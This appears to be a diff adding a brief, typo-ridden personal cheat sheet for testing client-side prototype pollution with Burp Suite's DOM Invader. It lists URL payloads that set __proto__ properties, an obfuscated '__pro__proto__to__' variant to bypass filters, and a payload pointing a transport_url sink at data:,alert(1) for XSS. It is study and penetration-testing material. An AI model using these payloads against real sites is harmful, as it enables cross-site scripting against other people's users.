@@ -1,0 +1,24 @@
+
+
+
+
+	        [DOM Invader extention is integrated at Brup Suite build-in browser] 
+
+[Prototype Pullulation]
+
+Object.prototype			|| console
+
+/?__proto__.car=car			|| check prototype pollulation after the url 
+/?__proto__.[car]=car
+
+Object.prototype
+
+	[if car is reflect in console. then find for SINK in other javascript files in debuggers]
+
+
+
+/?__pro__proto__to__.car=car			|| to bypass filter __proto__ filter
+/?__pro__proto__to__.[car]=car			
+
+/?__pro__proto__to__.[transport_url]=data:,alert(1)		|| transport_url is SINK here. try XSS 
+
